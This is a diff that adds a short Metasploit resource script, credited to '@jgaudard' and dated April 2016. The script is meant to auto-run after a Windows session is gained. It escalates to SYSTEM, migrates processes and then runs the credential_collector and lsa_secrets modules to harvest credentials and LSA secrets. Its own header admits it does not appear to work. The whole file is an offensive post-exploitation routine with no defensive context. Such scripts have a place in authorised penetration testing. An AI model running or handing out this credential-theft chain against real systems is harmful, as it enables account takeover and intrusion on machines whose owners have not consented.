@@ -1,0 +1,13 @@
+#######################################################
+# Created by @jgaudard
+# Uses AutoRunScript
+# !!! Does not appear to work, use auto_post.rc !!! 
+# Created: 30 April 2016    Edited: 30 April 2016
+# Version 0.1
+#######################################################
+
+run post/windows/escalate/getsystem
+run post/windows/manage/smart_migrate
+run post/windows/gather/credentials/credential_collector
+run post/windows/gather/lsa_secrets
+
